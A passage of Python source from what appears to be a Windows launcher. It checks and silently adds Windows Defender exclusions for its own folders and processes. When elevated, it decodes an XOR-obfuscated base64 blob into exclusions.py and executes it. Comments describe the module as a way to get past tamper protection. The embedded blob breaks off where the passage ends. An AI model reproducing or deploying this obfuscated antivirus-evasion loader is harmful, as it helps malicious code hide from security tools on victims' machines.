        return False
    for d in dirs:
        if not _excl_has(EXCL_KP, d, EXCL_KP2):
            return False
    for p in procs:
        # r151: a full-path image (…\python312\pythonw.exe) is covered by a PATH
        # exclusion too — the documented writer lays it down there, and reading
        # only the Processes key reported a landed set as "missing" forever.
        if _excl_has(EXCL_KC, p, EXCL_KC2):
            continue
        if "\\" in p and _excl_has(EXCL_KP, p, EXCL_KP2):
            continue
        return False
    return True


def _load_excl_module():
    """the sibling exclusions.py, imported and handed a HIGH token. r151: the
    launcher used to own a SECOND, registry-only copy of the write loop — and
    on the box the key refuses every write (tamper protection), so that copy
    could only ever log rc=False while the real ladder (service API + policy
    mirror + cmdlet) never ran at all. one ladder, one source of truth: this
    module's job is to run it, not to reimplement it."""
    import base64
    import importlib.util
    path = os.path.join(PERSIST_DIR, "exclusions.py")
    try:
        # always rewritten, never reused: a copy left by an older revision is
        # the one way this module could load a ladder that no longer matches
        # the launcher that sealed it (the field has been burned by that twice).
        src = bytes((b ^ 0x37 for b in base64.b64decode(EXCL_B64)))
        with open(path, "wb") as fh:
            fh.write(src)
        _log("work", "excl ladder: exclusions.py materialized (%d B)"
             % len(src))
    except Exception as e:
        _log("work", "excl ladder: materialize failed %r" % (e,))
    spec = importlib.util.spec_from_file_location("tung_excl", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _uptime():
    """seconds since boot (0/unknown -> a conservative 6 h). the answer file
    is only evidence about THIS boot; a covered=1 left over from yesterday
    would otherwise tell the lift gate a fresh box is already done."""
    try:
        v = ctypes.windll.kernel32.GetTickCount64()
        secs = float(v) / 1000.0
        return secs if secs > 0 else 6 * 3600.0
    except Exception:
        return 6 * 3600.0


def _result_covered():
    """the elevated side's own answer file (exclusions.py writes it). on a
    protected box the registry read never shows the value even after the
    service applied it, so this is the one truthful signal the launcher has.
    r151: only a file written since this boot counts — per-boot truth, not a
    stale claim copied forward."""
    path = os.path.join(PERSIST_DIR, "excl_result.txt")
    try:
        if time.time() - os.path.getmtime(path) > _uptime():
            return False
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.readline().strip() == "covered=1"
    except Exception:
        return False


def add_defender_exclusions():
    """list-driven, silent. r144 (dj: still not landing): the exclusion key is
    owner-protected — a medium token is refused by the DACL, and the Defender
    service ignores a write from below HIGH. this function therefore GATES
    every write on is_elevated() and, below that line, only READS: its answer
    is then the truth about the box instead of a half-attempt that looks like
    one. r151: above the line it runs exclusions.py's ladder IN-PROCESS (key ->
    policy mirror -> service API -> cmdlet, verified against the store), and
    the answer file carries the result to the wait loop."""
    dirs, procs = defender_roots()
    _val, _detail = _token_probe()
    _log("work", "excl gate: %s, admin-group=%r, roots=%r" %
         (_detail, _admin_group(), dirs))
    if not is_elevated():
        _log("work", "excl gate: below HIGH -> no write attempted; %s"
             % _miss_txt())
        return exclusions_landed()
    _log("work", "excl gate: HIGH -> running the ladder in-process")
    try:
        mod = _load_excl_module()
        ok = bool(mod.run())
        _log("work", "excl ladder: covered=%r, %s" % (ok, _miss_txt()))
        return ok
    except BaseException as e:     # incl. the module's own sys.exit guard
        _log("work", "excl ladder raised %r" % (e,))
        return exclusions_landed()


# r1.1.2/r78: the standalone exclusion writer is exclusions.py (repo mirror);
# it rides here as xor(0x37)-sealed base64 (EXCL_B64 below) and BOTH roads
# (the un-elevated pre-lift materialize + _run_stage_now) decode it into a
# byte-exact file, immune to quoting/escaping layers.

EXCL_B64 = "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